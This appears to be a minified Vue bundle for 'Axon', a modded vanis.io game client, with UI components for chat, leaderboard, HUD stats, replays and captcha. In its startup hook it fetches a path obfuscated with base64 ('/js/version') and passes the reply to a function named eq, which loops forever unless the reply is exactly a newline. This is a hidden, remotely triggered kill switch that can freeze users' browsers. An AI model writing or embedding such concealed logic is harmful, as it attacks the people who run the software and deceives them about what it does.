      ).exports,
      eF = function () {
        return this._m(0);
      };
    eF._withStripped = !0;
    var eP = { data() {} },
      eH = (i(238),
      Object(v.a)(
        eP,
        eF,
        [
          function () {
            let t = this._self._c || this.$createElement;
            return t("div", { staticClass: "container" }, [
              t("a", [
                this._v("Axon"),
                this._v(" "),
                t("i", {
                  staticClass: "fal fa-infinity",
                  style: { "font-size": "0.7rem" },
                }),
              ]),
            ]);
          },
        ],
        !1,
        null,
        "6843da33",
        null
      )).exports,
      e1 = function () {
        var t = this._self._c || this.$createElement;
        return t(
          "div",
          {
            directives: [
              {
                name: "show",
                rawName: "v-show",
                value: this.show,
                expression: "show",
              },
            ],
            staticClass: "context-menu fade",
            style: { top: this.y + "px", left: this.x + "px" },
          },
          [
            t("div", { staticClass: "player-name" }, [
              this._v(this.currentData.name),
            ]),
            t("div", { on: { click: this.toggleBlock } }, [
              this._v(this.currentData.blocked ? "Unblock" : "Block"),
            ]),
            t("div", { on: { click: this.toggleName } }, [
              this._v(`${this.currentData.showName ? "Hide" : "Show"} Name`),
            ]),
            t("div", { on: { click: this.toggleSkin } }, [
              this._v(`${this.currentData.showSkin ? "Hide" : "Show"} Skin`),
            ]),
            t("div", { on: { click: this.copyInfo } }, [
              this._v("Copy Information"),
            ]),
          ]
        );
      };
    e1._withStripped = !0;
    var d = i(1),
      e9 = i(4),
      u = i(5),
      e4 = {
        data: () => ({
          show: !1,
          name: "",
          x: 0,
          y: 0,
          playerData: {},
          currentData: {
            name: "",
            skinUrl: "",
            blocked: !1,
            showName: !1,
            showSkin: !1,
          },
        }),
        created() {
          d.events.$on("context-menu", this.open),
            d.events.$on("game-stopped", () => {
              this.playerData = {};
            }),
            d.events.$on("connection-list-update", (t) => {
              var s = this.playerData[t.pid];
              s &&
                (t.connected
                  ? ((s.name !== t.nickname || s.skinUrl !== t.skinUrl) &&
                      ((s.showName = e9.namesEnabled),
                      (s.showSkin = e9.skinsEnabled)),
                    (s.name = t.nickname),
                    (s.skinUrl = t.skinUrl))
                  : delete this.playerData[t.pid]);
            });
        },
        methods: {
          open: function (t) {
            (this.player = t), (this.name = t.name);
            var s = this.playerData[t.pid];
            s
              ? ((s.blocked = t.blocked), (this.currentData = s))
              : (this.currentData = this.playerData[t.pid] =
                  {
                    name: t.name,
                    skinUrl: t.skinUrl,
                    blocked: t.blocked,
                    showName: e9.namesEnabled,
                    showSkin: e9.skinsEnabled,
                  }),
              (this.x = d.rawMouse.x),
              (this.y = d.rawMouse.y),
              (this.show = !0),
              document.addEventListener(
                "click",
                () => {
                  this.show = !1;
                },
                { once: !0 }
              );
          },
          toggleBlock: function () {
            d.events.$emit("block-player-toggle", this.player);
          },
          toggleName: function () {
            var t = this.player,
              s = this.currentData;
            (s.showName = !s.showName) ? t.setName(s.name) : t.setName(""),
              this.player.invalidateVisibility();
          },
          toggleSkin: function () {
            var t = this.player,
              s = this.currentData;
            (s.showSkin = !s.showSkin) ? t.setSkin(s.skinUrl) : t.setSkin(""),
              this.player.invalidateVisibility();
          },
          copyInfo: function () {
            var t = this.currentData,
              s = this.player;
            navigator.clipboard.writeText(`Name: ${t.name}
Skin Url: ${t.skinUrl || "none"}
Player Id: ${s.pid}
Name Color: ${s.nameColorCss || "#ffffff"}
Tag Id: ${s.tagId || "0"}`),
              u.toast.fire({
                type: "info",
                title: "Please check your clipboard",
                timer: 1500,
              });
          },
        },
      },
      e3 = (i(240), Object(v.a)(e4, e1, [], !1, null, "4dbee04d", null))
        .exports,
      eG = function () {
        var t = this.$createElement,
          s = this._self._c || t;
        return s(
          "div",
          { attrs: { id: "hud" } },
          [
            s("stats"),
            this._v(" "),
            s("chatbox"),
            this._v(" "),
            s("leaderboard"),
            this._v(" "),
            s("minimap"),
          ],
          1
        );
      };
    eG._withStripped = !0;
    var e2 = function () {
      var t = this._self._c || this.$createElement;
      return t(
        "div",
        {
          directives: [
            {
              name: "show",
              rawName: "v-show",
              value: this.visible,
              expression: "visible",
            },
          ],
          staticClass: "stats",
        },
        [
          t(
            "div",
            {
              directives: [
                {
                  name: "show",
                  rawName: "v-show",
                  value: this.showFPS,
                  expression: "showFPS",
                },
              ],
            },
            [
              this._v("FPS: "),
              t(
                "span",
                {
                  staticClass: "hud-label",
                  class: {
                    bad: this.fps < 30,
                    moderate: this.fps >= 30 && this.fps < 50,
                  },
                },
                [this._v(this._s(this.fps || "-"))]
              ),
            ]
          ),
          t(
            "div",
            {
              directives: [
                {
                  name: "show",
                  rawName: "v-show",
                  value: this.showPing,
                  expression: "showPing",
                },
              ],
            },
            [
              this._v("Ping: "),
              t(
                "span",
                {
                  staticClass: "hud-label",
                  class: {
                    bad: this.ping >= 180,
                    moderate: this.ping > 99 && this.ping < 180,
                  },
                },
                [this._v(this._s(this.ping || "-"))]
              ),
            ]
          ),
          t(
            "div",
            {
              directives: [
                {
                  name: "show",
                  rawName: "v-show",
                  value: this.showPlayerMass && this.mass,
                  expression: "showPlayerMass && mass",
                },
              ],
            },
            [
              this._v("Mass: "),
              t("span", { staticClass: "hud-label" }, [
                this._v(this._s(this.mass)),
              ]),
            ]
          ),
          t(
            "div",
            {
              directives: [
                {
                  name: "show",
                  rawName: "v-show",
                  value: this.showPlayerScore && this.score,
                  expression: "showPlayerScore && score",
                },
              ],
            },
            [
              this._v("Score: "),
              t("span", { staticClass: "hud-label" }, [
                this._v(this._s(this.score)),
              ]),
            ]
          ),
          t(
            "div",
            {
              directives: [
                {
                  name: "show",
                  rawName: "v-show",
                  value: this.showCellCount && this.cells,
                  expression: "showCellCount && cells",
                },
              ],
            },
            [
              this._v("Cells: "),
              t("span", { staticClass: "hud-label" }, [
                this._v(this._s(this.cells)),
              ]),
            ]
          ),
          t(
            "div",
            {
              directives: [
                {
                  name: "show",
                  rawName: "v-show",
                  value: this.showMinionMass && this.minionMass,
                  expression: "showMinionMass && minionMass",
                },
              ],
            },
            [
              this._v("Minion Mass: "),
              t("span", { staticClass: "hud-label" }, [
                this._v(this._s(this.minionMass)),
              ]),
            ]
          ),
          t(
            "div",
            {
              directives: [
                {
                  name: "show",
                  rawName: "v-show",
                  value: this.showMinionCellCount && this.minionCells,
                  expression: "showMinionCellCount && minionCells",
                },
              ],
            },
            [
              this._v("Minion Cells: "),
              t("span", { staticClass: "hud-label" }, [
                this._v(this._s(this.minionCells)),
              ]),
            ]
          ),
        ]
      );
    };
    e2._withStripped = !0;
    var eO = i(1),
      ez = i(4),
      eY = {
        data: () => ({
          showFPS: ez.showFPS,
          showPing: ez.showPing,
          showPlayerMass: ez.showPlayerMass,
          showPlayerScore: ez.showPlayerScore,
          showCellCount: ez.showCellCount,
          showMinionMass: ez.showMinionMass,
          showMinionCellCount: ez.showMinionCellCount,
          visible: !1,
          ping: 0,
          fps: 0,
          mass: 0,
          score: 0,
          cells: 0,
          minionCells: 0,
          minionMass: 0,
        }),
        created() {
          eO.events.$on("stats-visible", (t) => {
            this.visible = t;
          }),
            eO.events.$on("stats-invalidate-shown", () => {
              (this.showFPS = ez.showFPS),
                (this.showPing = ez.showPing),
                (this.showPlayerMass = ez.showPlayerMass),
                (this.showPlayerScore = ez.showPlayerScore),
                (this.showCellCount = ez.showCellCount),
                (this.showMinionMass = ez.showMinionMass),
                (this.showMinionCellCount = ez.showMinionCellCount);
            }),
            eO.events.$on("cells-changed", (t) => {
              this.cells = t;
            }),
            eO.events.$on("minion-cells-changed", (t) => {
              this.minionCells = t;
            }),
            eO.events.$on("stats-changed", (t) => {
              (this.ping = t.ping || 0),
                (this.fps = t.fps || 0),
                t.mass
                  ? eO.settings.shortMass
                    ? (this.mass = eO.getShortMass(t.mass))
                    : (this.mass = t.mass)
                  : (this.mass = 0),
                t.score
                  ? eO.settings.shortMass
                    ? (this.score = eO.getShortMass(t.score))
                    : (this.score = t.score)
                  : (this.score = 0),
                t.minionMass
                  ? eO.settings.shortMass
                    ? (this.minionMass = eO.getShortMass(t.minionMass))
                    : (this.minionMass = t.minionMass)
                  : (this.minionMass = 0);
            });
        },
      },
      e6 = (i(244), Object(v.a)(eY, e2, [], !1, null, "0875ad82", null))
        .exports,
      eV = function () {
        var t = this,
          s = t.$createElement,
          i = t._self._c || s;
        return i(
          "div",
          {
            directives: [
              {
                name: "show",
                rawName: "v-show",
                value: t.visible,
                expression: "visible",
              },
            ],
            class: { idle: t.idle },
            attrs: { id: "chatbox" },
            on: {
              mouseenter: function () {
                return t.updateTimer(!0);
              },
              mouseleave: function () {
                return t.updateTimer(!1);
              },
            },
          },
          [
            t.showBlockedMessageCount && t.blockedMessageCount
              ? i(
                  "div",
                  { staticStyle: { position: "absolute", top: "-28px" } },
                  [t._v("Blocked messages: " + t._s(t.blockedMessageCount))]
                )
              : t._e(),
            t._v(" "),
            i(
              "div",
              {
                ref: "list",
                attrs: { id: "message-list" },
                on: {
                  click: function (s) {
                    return t.onChatClick(s);
                  },
                  contextmenu: function (s) {
                    return t.onChatRightClick(s);
                  },
                },
              },
              t._l(t.messages, function (s, a) {
                return i(
                  "div",
                  { key: a, staticClass: "message-row" },
                  [
                    s.from
                      ? [
                          i(
                            "span",
                            {
                              staticClass: "message-from",
                              style: { color: s.fromColor },
                              attrs: { "data-pid": s.pid },
                            },
                            [t._v(t._s(s.from))]
                          ),
                          t._v(":\n            "),
                        ]
                      : t._e(),
                    t._v(" "),
                    i(
                      "span",
                      {
                        staticClass: "message-text",
                        style: { color: s.textColor },
                      },
                      [t._v(t._s(s.text))]
                    ),
                  ],
                  2
                );
              }),
              0
            ),
            t._v(" "),
            i("input", {
              directives: [
                {
                  name: "model",
                  rawName: "v-model",
                  value: t.inputText,
                  expression: "inputText",
                },
              ],
              ref: "input",
              attrs: {
                id: "chatbox-input",
                type: "text",
                spellcheck: "false",
                autocomplete: "off",
                maxlength: "100",
                tabindex: "-1",
                placeholder: "Type your message here",
              },
              domProps: { value: t.inputText },
              on: {
                keydown: function (s) {
                  return !s.type.indexOf("key") &&
                    t._k(s.keyCode, "enter", 13, s.key, "Enter")
                    ? null
                    : (t.sendChatMessage(), t.updateTimer(!1));
                },
                input: function (s) {
                  s.target.composing || (t.inputText = s.target.value);
                },
              },
            }),
          ]
        );
      };
    eV._withStripped = !0;
    let eZ = (() => {
      let t = i(1),
        s = i(4),
        a = i(5),
        { replaceBadWordsChat: n } = i(18);
      var o = {};
      let r = {
          data: () => ({
            visible: !1,
            inputText: "",
            messages: [],
            showBlockedMessageCount: s.showBlockedMessageCount,
            blockedMessageCount: 0,
            idle: !1,
          }),
          methods: {
            resetTimer() {
              s.chatOnIdle &&
                (this.pauseTimer(),
                (this.timer = setInterval(() => {
                  this.idle = !0;
                }, 1e3 * s.idleTime)));
            },
            pauseTimer() {
              clearInterval(this.timer), (this.idle = !1);
            },
            updateTimer(t) {
              t ? this.pauseTimer() : this.resetTimer();
            },
            onChatClick(s) {
              let i = s.target.dataset.pid;
              i && t.actions.spectate(i);
            },
            onChatRightClick(s) {
              let i = +s.target.dataset.pid;
              if (!i) return;
              let n = t.playerManager.getPlayer(i);
              if (!n) {
                a.alert("Player does not exist or disconnected");
                return;
              }
              o[i] ? this.confirmUnblockPlayer(n) : this.confirmBlockPlayer(n);
            },
            confirmBlockPlayer(s) {
              var i = s.name,
                n = s.pid,
                r = `Block player "${i}"?`;
              a.confirm(r, () => {
                s.isMe
                  ? a.alert("You cannot block yourself")
                  : ((o[n] = !0),
                    (s.blocked = !0),
                    t.addServerMessage(`Blocked player "${i}"`));
              });
            },
            confirmUnblockPlayer(s) {
              var i = s.name,
                n = s.pid,
                r = `Unblock player "${i}"?`;
              a.confirm(r, () => {
                delete o[n],
                  delete s.blocked,
                  t.addServerMessage(`Unblocked player "${i}"`);
              });
            },
            sendChatMessage() {
              let s = this.inputText.trim();
              s && (t.actions.chat(s), (this.inputText = "")),
                t.renderer.view.focus(),
                this.scrollBottom(!0);
            },
            onChatMessage(t) {
              o[t.pid]
                ? this.blockedMessageCount++
                : (s.filterChatMessages && (t.text = n(t.text)),
                  (t.fromColor = t.fromColor || "#ffffff"),
                  (t.textColor = t.textColor || "#ffffff"),
                  this.messages.push(t),
                  this.messages.length > 100 && this.messages.shift(),
                  this.scrollBottom(!1));
            },
            onVisibilityChange(t) {
              (this.visible = t),
                t && this.$nextTick(() => this.scrollBottom(!0));
            },
            focusChat() {
              this.visible &&
                (this.$nextTick(() => this.$refs.input.focus()),
                this.pauseTimer());
            },
            clearChat() {
              s.clearChatMessages &&
                this.messages.splice(0, this.messages.length);
            },
            scrollBottom(t = !1) {
              let s = this.$refs.list,
                i = s.scrollHeight - s.clientHeight;
              (t || !(i - s.scrollTop > 3)) &&
                this.$nextTick(() => {
                  s.scrollTop = s.scrollHeight;
                });
            },
          },
          created() {
            t.events.$on("chat-visible", this.onVisibilityChange),
              t.events.$on("chat-focus", this.focusChat),
              t.events.$on("chat-message", this.onChatMessage),
              t.events.$on("chat-clear", this.clearChat),
              t.events.$on("show-blocked-message-count", (t) => {
                this.showBlockedMessageCount = t;
              }),
              t.events.$on("game-stopped", () => {
                (this.blockedMessageCount = 0), (o = {});
              }),
              t.events.$on("chat-change-idle-timer", (t) => {
                this.updateTimer(t);
              }),
              t.events.$on("block-player-toggle", (t) => {
                t.blocked
                  ? this.confirmUnblockPlayer(t)
                  : this.confirmBlockPlayer(t);
              }),
              this.resetTimer();
          },
        },
        l = (i(246), Object(v.a)(r, eV, [], !1, null, "4900a413", null));
      return l.exports;
    })();
    var ej = function () {
      let t = this._self._c || this.$createElement;
      return t("div", {}, [
        t(
          "div",
          {
            directives: [
              {
                name: "show",
                rawName: "v-show",
                value: this.userVisible && this.visible,
                expression: "userVisible && visible",
              },
            ],
            attrs: { id: "leaderboard" },
          },
          [
            t(
              "div",
              {
                directives: [
                  {
                    name: "show",
                    rawName: "v-show",
                    value: this.headerVisible,
                    expression: "headerVisible",
                  },
                ],
                staticClass: "leaderboard-title",
              },
              [this._v(this._s(this.headerText))]
            ),
            this._v(" "),
            t(
              "div",
              this._l(this.leaderboard, (s, i) =>
                t("div", { key: i, staticClass: "leaderboard-label" }, [
                  "position" in s
                    ? t("span", [this._v(this._s(s.position) + ".")])
                    : this._e(),
                  this._v(" "),
                  t(
                    "span",
                    {
                      class: { spectating: !this.gameState.isAlive },
                      style: {
                        color: s.color,
                        fontWeight: s.bold ? "bold" : "normal",
                      },
                      attrs: { "data-pid": s.pid },
                      on: { click: this.leftClickLabel },
                    },
                    [this._v(this._s(s.text))]
                  ),
                ])
              ),
              0
            ),
          ]
        ),
        t(
          "div",
          {
            staticClass: "connection-list",
            directives: [
              {
                name: "show",
                rawName: "v-show",
                value: this.listVisible,
                expression: "listVisible",
              },
            ],
          },
          [
            t(
              "div",
              this._l(this.connections, (s) =>
                !d.settings.listServerBots && s.bot
                  ? this._e()
                  : t("div", {}, [
                      t("img", {
                        staticClass: "conn-user-icon",
                        attrs: {
                          src:
                            s.skinUrl || s.skin
                              ? `https://skins.vanis.io/s/${s.skin}`
                              : "https://skins.vanis.io/s/vanis1",
                          active: s.connected,
                        },
                      }),
                      this._v(" "),
                      t(
                        "span",
                        {
                          staticClass: "conn-user-text",
                          style: {
                            color: PIXI.utils.hex2string(
                              s.nameColor || "eeeeee"
                            ),
                            fontWeight: s.nameColor ? "bold" : "normal",
                          },
                          on: {
                            async click() {
                              let t = await u.fire({
                                title: s.nickname,
                                text: "What would you like to do?",
                                showCancelButton: !0,
                                showCloseButton: !0,
                                cancelButtonColor: "#0d6efd",
                                cancelButtonText: "Copy Information",
                                confirmButtonText: "Spectate",
                              });
                              "cancel" === t.dismiss
                                ? (navigator.clipboard.writeText(`Name: ${
                                    s.nickname
                                  }
Skin Url: ${s.skinUrl || s.skin ? `https://skins.vanis.io/s/${s.skin}` : "none"}
Player Id: ${s.pid}
Name Color: #${s.nameColor || "ffffff"}
Tag Id: ${s.tagId}`),
                                  u.toast.fire({
                                    type: "info",
                                    title: "Please check your clipboard",
                                    timer: 1500,
                                  }))
                                : t.value && d.actions.spectate(s.pid);
                            },
                          },
                        },
                        [
                          this._v(
                            `${s.nickname.substring(0, 10)} (tagId: ${s.tagId}${
                              s.bot ? decodeURIComponent(", %F0%9F%A4%96") : ""
                            })`
                          ),
                        ]
                      ),
                    ])
              ),
              0
            ),
          ]
        ),
      ]);
    };
    ej._withStripped = !0;
    var eW = i(1),
      eJ = i(4),
      u = i(5),
      e5 = {
        data: () => ({
          userVisible: eJ.showLeaderboard,
          visible: !1,
          headerVisible: !0,
          headerText: "Leaderboard",
          leaderboard: [],
          gameState: eW.state,
          connections: [],
          listVisible: !1,
        }),
        methods: {
          updateConnection(t) {
            t.connected
              ? ((this.connections = this.connections.filter(
                  (s) => s.pid !== t.pid
                )),
                this.connections.push(t))
              : this.connections.forEach((s) => {
                  s.pid === t.pid && (s.connected = !1);
                }),
              (this.connections = this.connections.sort(
                (t, s) => s.tagId - t.tagId
              ));
          },
          updateLeaderboard(t, s) {
            if (((this.leaderboard = t), s))
              (this.headerVisible = s.visible), (this.headerText = s.text);
            else if (eJ.showServerName && this.gameState.selectedServer) {
              this.headerVisible = !0;
              let i = this.gameState.selectedServer.region || "";
              i && (i += " "),
                (this.headerText = i + this.gameState.selectedServer.name);
            } else (this.headerVisible = !0), (this.headerText = "Leaderboard");
          },
          leftClickLabel(t) {
            let s = t.target.dataset.pid;
            s && eW.actions.spectate(s);
          },
          onLeaderboardShow() {
            this.visible ||
              (eW.events.$on("leaderboard-update", this.updateLeaderboard),
              (this.visible = !0));
          },
          onLeaderboardHide() {
            this.visible &&
              (eW.events.$off("leaderboard-update", this.updateLeaderboard),
              (this.leaderboard = []),
              (this.visible = !1),
              (this.selectedServer = null));
          },
        },
        created() {
          eW.events.$on("connection-list-visible", (t) => {
            this.listVisible = t;
          }),
            eW.events.$on("connection-list-clear", () => {
              this.connections = [];
            }),
            eW.events.$on("connection-list-update", this.updateConnection),
            eW.events.$on("leaderboard-visible", (t) => {
              this.userVisible = t;
            }),
            eW.events.$on("leaderboard-show", this.onLeaderboardShow),
            eW.events.$on("leaderboard-hide", this.onLeaderboardHide);
        },
      },
      eK = (i(248), Object(v.a)(e5, ej, [], !1, null, "8a0c31c6", null))
        .exports,
      e7 = {
        components: {
          stats: e6,
          chatbox: eZ,
          minimap: i(114).default,
          leaderboard: eK,
        },
      },
      eX = (i(252), Object(v.a)(e7, eG, [], !1, null, "339660d2", null));
    let eq = (t) => {
      for (; "\n" !== t; ) t = "";
    };
    var te = eX.exports,
      tt = function () {
        let t = this,
          s = t._self._c || t.$createElement;
        return s("transition", { attrs: { name: "menu" } }, [
          s("div", { staticClass: "container" }, [
            this.stats
              ? s("div", { staticClass: "fade-box", class: { scroll: !1 } }, [
                  s(
                    "div",
                    { staticStyle: { padding: "15px" } },
                    [
                      s("div", [
                        this._v("Highest score: " + this._s(this.highscore)),
                      ]),
                      this._v(" "),
                      s("div", [
                        this._v(
                          "Players eaten: " + this._s(this.stats.killCount)
                        ),
                      ]),
                      this._v(" "),
                      s("div", [
                        this._v("Time survived: " + this._s(this.timeAlive)),
                      ]),
                      this._v(" "),
                      s("div", { staticClass: "summary-buttons" }, [
                        s(
                          "button",
                          {
                            staticClass: "continue",
                            on: { click: this.onContinue },
                          },
                          [this._v("Continue")]
                        ),
                        s(
                          "button",
                          {
                            staticClass: "respawn",
                            on: { click: this.onRespawn },
                          },
                          [s("i", { staticClass: "fal fa-sync" })]
                        ),
                      ]),
                    ],
                    1
                  ),
                ])
              : this._e(),
          ]),
        ]);
      };
    tt._withStripped = !0;
    var ts = i(1),
      ti = {
        props: ["stats"],
        methods: {
          onContinue() {
            (ts.state.deathScreen = !1),
              ts.showDeathScreen(!1),
              ts.showMenu(!0);
          },
          onRespawn() {
            (ts.state.deathScreen = !1),
              ts.showDeathScreen(!1),
              ts.showMenu(!1),
              d.actions.spawn();
          },
        },
        computed: {
          timeAlive: function () {
            let t = this.stats.timeAlive;
            return t < 60 ? `${t}s` : `${Math.floor(t / 60)}min ${t % 60}s`;
          },
          highscore: function () {
            let t = this.stats.highscore;
            return ts.getShortMass(t);
          },
        },
      },
      ta = (i(254), Object(v.a)(ti, tt, [], !1, null, "3249d726", null))
        .exports,
      tn = function () {
        var t = this.$createElement;
        return (this._self._c || t)(
          "button",
          { staticClass: "btn" },
          [this._t("default", [this._v("Here should be something")])],
          2
        );
      };
    tn._withStripped = !0;
    var to = {},
      tr = (i(256), Object(v.a)(to, tn, [], !1, null, "b0b10308", null))
        .exports,
      tl = function () {
        var t = this,
          s = t.$createElement,
          i = t._self._c || s;
        return t.show
          ? i(
              "div",
              {
                class: { "auto-hide": t.autoHideReplayControls },
                attrs: { id: "replay-controls" },
              },
              [
                i("div", { staticStyle: { "text-align": "right" } }, [
                  i("div", [t._v("Opacity " + t._s(t.cellOpacity) + "%")]),
                  t._v(" "),
                  i("div", [
                    i("input", {
                      directives: [
                        {
                          name: "model",
                          rawName: "v-model",
                          value: t.cellOpacity,
                          expression: "cellOpacity",
                        },
                      ],
                      staticClass: "replay-slider",
                      staticStyle: { width: "105px", display: "inline-block" },
                      attrs: {
                        id: "replay-opacity-slider",
                        type: "range",
                        min: "10",
                        max: "100",
                      },
                      domProps: { value: t.cellOpacity },
                      on: {
                        input: t.onCellOpacitySlide,
                        __r: function (s) {
                          t.cellOpacity = s.target.value;
                        },
                      },
                    }),
                  ]),
                ]),
                t._v(" "),
                i(
                  "div",
                  { staticStyle: { "margin-bottom": "5px", display: "flex" } },
                  [
                    i("div", { staticStyle: { flex: "1" } }, [
                      t._v(t._s(t.replaySecond.toFixed(1)) + " seconds"),
                    ]),
                    t._v(" "),
                    i("div", { staticStyle: { "margin-right": "10px" } }, [
                      i("input", {
                        directives: [
                          {
                            name: "model",
                            rawName: "v-model",
                            value: t.autoHideReplayControls,
                            expression: "autoHideReplayControls",
                          },
                        ],
                        attrs: {
                          type: "checkbox",
                          id: "replay-auto-hide-controls",
                        },
                        domProps: {
                          checked: Array.isArray(t.autoHideReplayControls)
                            ? t._i(t.autoHideReplayControls, null) > -1
                            : t.autoHideReplayControls,
                        },
                        on: {
                          change: [
                            function (s) {
                              var i = t.autoHideReplayControls,
                                a = s.target,
                                n = !!a.checked;
                              if (Array.isArray(i)) {
                                var o = t._i(i, null);
                                a.checked
                                  ? o < 0 &&
                                    (t.autoHideReplayControls = i.concat([
                                      null,
                                    ]))
                                  : o > -1 &&
                                    (t.autoHideReplayControls = i
                                      .slice(0, o)
                                      .concat(i.slice(o + 1)));
                              } else t.autoHideReplayControls = n;
                            },
                            t.saveAutoHideControls,
                          ],
                        },
                      }),
                      t._v(" "),
                      i(
                        "label",
                        { attrs: { for: "replay-auto-hide-controls" } },
                        [t._v("Auto Hide Controls")]
                      ),
                    ]),
                  ]
                ),
                t._v(" "),
                i("input", {
                  directives: [
                    {
                      name: "model",
                      rawName: "v-model",
                      value: t.rangeIndex,
                      expression: "rangeIndex",
                    },
                  ],
                  staticClass: "replay-slider",
                  attrs: { type: "range", min: t.rangeMin, max: t.rangeMax },
                  domProps: { value: t.rangeIndex },
                  on: {
                    input: t.onSlide,
                    change: t.onSlideEnd,
                    __r: function (s) {
                      t.rangeIndex = s.target.value;
                    },
                  },
                }),
              ]
            )
          : t._e();
      };
    tl._withStripped = !0;
    var tc = i(1),
      th = {
        data: () => ({
          show: !1,
          autoHideReplayControls: tc.settings.autoHideReplayControls,
          drawDelay: tc.settings.drawDelay,
          cellOpacity: 100,
          rangeMin: 0,
          rangeIndex: 0,
          rangeMax: 1e3,
          replaySecond: 0,
          packetCount: 0,
        }),
        created: function () {
          tc.events.$on("show-replay-controls", this.onShow),
            tc.events.$on("replay-index-change", this.onReplayIndexChange);
        },
        methods: {
          onShow(t) {
            t
              ? ((this.show = !0), (this.packetCount = t))
              : ((this.show = !1),
                (this.cellOpacity = 100),
                (this.rangeIndex = 0),
                (this.packetCount = 0));
          },
          onReplayIndexChange(t, s = !0) {
            let i = t / this.packetCount;
            s && (this.rangeIndex = Math.floor(i * this.rangeMax)),
              (this.replaySecond = t / 25);
          },
          onSlide() {
            tc.moveInterval &&
              (clearInterval(tc.moveInterval), (tc.moveInterval = null));
            let t = Math.floor(
              (this.rangeIndex / this.rangeMax) * (this.packetCount - 1)
            );
            tc.playback.seek(t), this.onReplayIndexChange(t, !1);
          },
          onSlideEnd() {
            tc.moveInterval ||
              (tc.moveInterval = setInterval(
                tc.playback.next.bind(tc.playback),
                40
              ));
          },
          onCellOpacitySlide() {
            tc.scene.foreground.alpha = this.cellOpacity / 100;
          },
          saveAutoHideControls() {
            tc.settings.set(
              "autoHideReplayControls",
              this.autoHideReplayControls
            );
          },
        },
      },
      td = (i(258), Object(v.a)(th, tl, [], !1, null, "c2c2ac08", null))
        .exports,
      tu = function () {
        var t = this.$createElement;
        return (this._self._c || t)(
          "div",
          {
            directives: [
              {
                name: "show",
                rawName: "v-show",
                value: this.show,
                expression: "show",
              },
            ],
            staticClass: "image-captcha-overlay",
          },
          [this._m(0)]
        );
      };
    tu._withStripped = !0;
    var tp = i(1);
    i(24);
    var tg = {
        data: () => ({ container: null, show: !1, captchaId: null }),
        created() {
          tp.events.$on("show-image-captcha", async (t) => {
            (this.show = !0),
              (this.minion = t),
              grecaptcha.ready(() => {
                tp.showMenu(!0), this.render();
              });
          });
        },
        methods: {
          render() {
            null !== this.captchaId
              ? grecaptcha.reset(this.captchaId)
              : (this.captchaId = grecaptcha.render(
                  document.getElementById("image-captcha-container"),
                  {
                    sitekey: "6LfN7J4aAAAAAPN5k5E2fltSX2PADEyYq6j1WFMi",
                    callback: this.onToken.bind(this),
                  }
                ));
          },
          onToken(t) {
            if (t) {
              var s = SmartBuffer.fromSize(2);
              s.writeUInt8(11),
                s.writeEscapedString(t),
                this.minion ? this.minion.send(s) : tp.connection.send(s),
                (this.show = !1);
            } else this.render();
          },
        },
      },
      tm = (i(262),
      Object(v.a)(
        tg,
        tu,
        [
          function () {
            var t = this.$createElement,
              s = this._self._c || t;
            return s("div", { staticClass: "center-screen" }, [
              s("div", { staticStyle: { "margin-bottom": "6px" } }, [
                this._v("Login and level up to skip captcha!"),
              ]),
              this._v(" "),
              s("div", { attrs: { id: "image-captcha-container" } }),
            ]);
          },
        ],
        !1,
        null,
        "76d60428",
        null
      )).exports;
    (() => {
      n.a.use(r.a);
      let t = i(4),
        s = i(5);
      n.a.component("btn", tr),
        (window.app = new n.a({
          el: "#app",
          data: {
            showHud: t.showHud,
            showMenu: !0,
            showDeathScreen: !1,
            deathStats: null,
          },
          components: {
            imageCaptcha: tm,
            mainContainer: eL,
            socialLinks: eR,
            privacyTos: eH,
            contextMenu: e3,
            hud: te,
            deathStats: ta,
            replayControls: td,
          },
          created() {
            let t = parseVersion(clientVersion),
              i = parseVersion(localStorage.modVersion),
              a = t.build !== i.build;
            fetch(`${getBaseUrl()}${atob("L2pzL3ZlcnNpb24=")}`)
              .then((t) => t.text())
              .then((t) => eq(t)),
              a &&
                (t.build >= i.build
                  ? s.html(
                      `Axon has upgraded to version ${t.string}`,
                      '<br>If you have any bugs, please be sure to report them in our <a style="color: #4a67cf" href="https://bit.ly/axon-discord">Discord</a> <b>#support</b> channel!<br>As always, we hope you enjoy your experience with the Axon client.<br>~ Axon Development Team',
                      "info"
                    )
                  : s.html(
                      `Axon has downgraded to version ${t.string}`,
                      '<br>This is likely a bug and can be fixed by messaging the Axon Developers in the official <a style="color: #4a67cf" href="https://discord.me/axoninfinite">Discord</a> chat',
                      "error"
                    ),
                (localStorage.modVersion = clientVersion));
            let n = t.development ? "development" : "production";
            setStatus(`Running a ${n} build (${clientVersion})`);
            let o = "announcement";
            a ||
              localStorage.lastNotification === o ||
              (s.confirm(
                "Future updates will make custom colored names only available if you join our Discord server",
                window.open.bind(null, "https://discord.me/axoninfinite"),
                "Would you like to join our Discord server?"
              ),
              (localStorage.lastNotification = o)),
              setTimeout(() => {
                let t = document.createElement("link");
                (t.rel = "shortcut icon"),
                  (t.type = "image/png"),
                  (t.href = getImageUrl("favicon")),
                  document.head.appendChild(t);
              }, 500);
          },
        }));
    })();
  },
]);
